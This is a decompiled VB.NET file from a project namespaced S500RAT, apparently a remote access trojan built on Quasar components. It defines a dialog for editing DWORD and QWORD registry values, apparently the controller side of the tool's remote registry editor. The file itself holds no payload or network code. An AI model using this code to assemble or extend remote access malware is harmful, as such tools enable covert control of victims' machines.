Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Gry.Helper
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32
Imports Quasar.Common.Utilities

Namespace S500RAT
	' Token: 0x0200002C RID: 44
	<DesignerGenerated()>
	Public Partial Class FormRegValueEditWord
		Inherits Form

		' Token: 0x1700034A RID: 842
		' (get) Token: 0x0600085B RID: 2139 RVA: 0x00044EF8 File Offset: 0x000430F8
		' (set) Token: 0x0600085C RID: 2140 RVA: 0x00044F02 File Offset: 0x00043102
		Private Overridable Property baseBox As GroupBox

		' Token: 0x1700034B RID: 843
		' (get) Token: 0x0600085D RID: 2141 RVA: 0x00044F0B File Offset: 0x0004310B
		' (set) Token: 0x0600085E RID: 2142 RVA: 0x00044F15 File Offset: 0x00043115
		Private Overridable Property radioDecimal As RadioButton

		' Token: 0x1700034C RID: 844
		' (get) Token: 0x0600085F RID: 2143 RVA: 0x00044F1E File Offset: 0x0004311E
		' (set) Token: 0x06000860 RID: 2144 RVA: 0x00044F28 File Offset: 0x00043128
		Private Overridable Property radioHexa As RadioButton
			<CompilerGenerated()>
			Get
				Return Me._radioHexa
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Dim value2 As EventHandler = AddressOf Me.RadioHexa_CheckedChanged
				Dim radioHexa As RadioButton = Me._radioHexa
				If radioHexa IsNot Nothing Then
					RemoveHandler radioHexa.CheckedChanged, value2
				End If
				Me._radioHexa = value
				radioHexa = Me._radioHexa
				If radioHexa IsNot Nothing Then
					AddHandler radioHexa.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x1700034D RID: 845
		' (get) Token: 0x06000861 RID: 2145 RVA: 0x00044F6B File Offset: 0x0004316B
		' (set) Token: 0x06000862 RID: 2146 RVA: 0x00044F78 File Offset: 0x00043178
		Private Overridable Property okButton As Button
			<CompilerGenerated()>
			Get
				Return Me._okButton
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.OkButton_Click
				Dim okButton As Button = Me._okButton
				If okButton IsNot Nothing Then
					RemoveHandler okButton.Click, value2
				End If
				Me._okButton = value
				okButton = Me._okButton
				If okButton IsNot Nothing Then
					AddHandler okButton.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700034E RID: 846
		' (get) Token: 0x06000863 RID: 2147 RVA: 0x00044FBB File Offset: 0x000431BB
		' (set) Token: 0x06000864 RID: 2148 RVA: 0x00044FC5 File Offset: 0x000431C5
		Private Overridable Property label2 As Label

		' Token: 0x1700034F RID: 847
		' (get) Token: 0x06000865 RID: 2149 RVA: 0x00044FCE File Offset: 0x000431CE
		' (set) Token: 0x06000866 RID: 2150 RVA: 0x00044FD8 File Offset: 0x000431D8
		Private Overridable Property valueNameTxtBox As TextBox

		' Token: 0x17000350 RID: 848
		' (get) Token: 0x06000867 RID: 2151 RVA: 0x00044FE1 File Offset: 0x000431E1
		' (set) Token: 0x06000868 RID: 2152 RVA: 0x00044FEB File Offset: 0x000431EB
		Private Overridable Property label1 As Label

		' Token: 0x17000351 RID: 849
		' (get) Token: 0x06000869 RID: 2153 RVA: 0x00044FF4 File Offset: 0x000431F4
		' (set) Token: 0x0600086A RID: 2154 RVA: 0x00044FFE File Offset: 0x000431FE
		Friend Overridable Property valueDataTxtBox As WordTextBox

		' Token: 0x17000352 RID: 850
		' (get) Token: 0x0600086B RID: 2155 RVA: 0x00045007 File Offset: 0x00043207
		' (set) Token: 0x0600086C RID: 2156 RVA: 0x00045014 File Offset: 0x00043214
		Private Overridable Property Button1 As Button
			<CompilerGenerated()>
			Get
				Return Me._Button1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim button As Button = Me._Button1
				If button IsNot Nothing Then
					RemoveHandler button.Click, value2
				End If
				Me._Button1 = value
				button = Me._Button1
				If button IsNot Nothing Then
					AddHandler button.Click, value2
				End If
			End Set
		End Property

		' Token: 0x0600086D RID: 2157 RVA: 0x00045058 File Offset: 0x00043258
		Public Sub New(value As RegistrySeeker.RegValueData)
			AddHandler MyBase.Load, AddressOf Me.FormRegValueEditWord_Load
			Me._value = value
			Me.InitializeComponent()
			Me.valueDataTxtBox.Text = value.Name
			Dim flag As Boolean = value.Kind = RegistryValueKind.DWord
			If flag Then
				Me.Text = "Edit DWORD (32-bit) Value"
				Me.valueDataTxtBox.Type = WordTextBox.WordType.DWORD
				Me.valueDataTxtBox.Text = Quasar.Common.Utilities.ByteConverter.ToUInt32(value.Data).ToString("x")
			Else
				Me.Text = "Edit QWORD (64-bit) Value"
				Me.valueDataTxtBox.Type = WordTextBox.WordType.QWORD
				Me.valueDataTxtBox.Text = Quasar.Common.Utilities.ByteConverter.ToUInt64(value.Data).ToString("x")
			End If
		End Sub

		' Token: 0x0600086E RID: 2158 RVA: 0x0004512C File Offset: 0x0004332C
		Private Sub OkButton_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.valueDataTxtBox.IsConversionValid() OrElse Me.IsOverridePossible()
			If flag Then
				Me._value.Data = If((Me._value.Kind = RegistryValueKind.DWord), Quasar.Common.Utilities.ByteConverter.GetBytes(Me.valueDataTxtBox.UIntValue), Quasar.Common.Utilities.ByteConverter.GetBytes(Me.valueDataTxtBox.ULongValue))
				MyBase.Tag = Me._value
				MyBase.DialogResult = DialogResult.OK
			Else
				MyBase.DialogResult = DialogResult.None
			End If
			MyBase.Close()
		End Sub

		' Token: 0x0600086F RID: 2159 RVA: 0x000451BC File Offset: 0x000433BC
		Private Sub RadioHexa_CheckedChanged(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.valueDataTxtBox.IsHexNumber = Me.radioHexa.Checked
			If Not flag Then
				Dim flag2 As Boolean = Me.valueDataTxtBox.IsConversionValid() OrElse Me.IsOverridePossible()
				If flag2 Then
					Me.valueDataTxtBox.IsHexNumber = Me.radioHexa.Checked
				Else
					Me.radioDecimal.Checked = True
				End If
			End If
		End Sub

		' Token: 0x06000870 RID: 2160 RVA: 0x0004522C File Offset: 0x0004342C
		Private Function ShowWarning(msg As String, caption As String) As DialogResult
			Return MessageBox.Show(msg, caption, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation)
		End Function

		' Token: 0x06000871 RID: 2161 RVA: 0x00045248 File Offset: 0x00043448
		Private Function IsOverridePossible() As Boolean
			Dim msg As String = If((Me._value.Kind = RegistryValueKind.DWord), "The decimal value entered is greater than the maximum value of a DWORD (32-bit number). Should the value be truncated in order to continue?", "The decimal value entered is greater than the maximum value of a QWORD (64-bit number). Should the value be truncated in order to continue?")
			Return Me.ShowWarning(msg, "Overflow") = DialogResult.Yes
		End Function

		' Token: 0x06000872 RID: 2162 RVA: 0x00045284 File Offset: 0x00043484
		Private Sub FormRegValueEditWord_Load(sender As Object, e As EventArgs)
			Me.MinimumSize = MyBase.Size
		End Sub

		' Token: 0x06000873 RID: 2163 RVA: 0x00045294 File Offset: 0x00043494
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			MyBase.Close()
		End Sub

		' Token: 0x040003BE RID: 958
		Private _value As RegistrySeeker.RegValueData

		' Token: 0x040003BF RID: 959
		Private Const DWORD_WARNING As String = "The decimal value entered is greater than the maximum value of a DWORD (32-bit number). Should the value be truncated in order to continue?"

		' Token: 0x040003C0 RID: 960
		Private Const QWORD_WARNING As String = "The decimal value entered is greater than the maximum value of a QWORD (64-bit number). Should the value be truncated in order to continue?"
	End Class
End Namespace
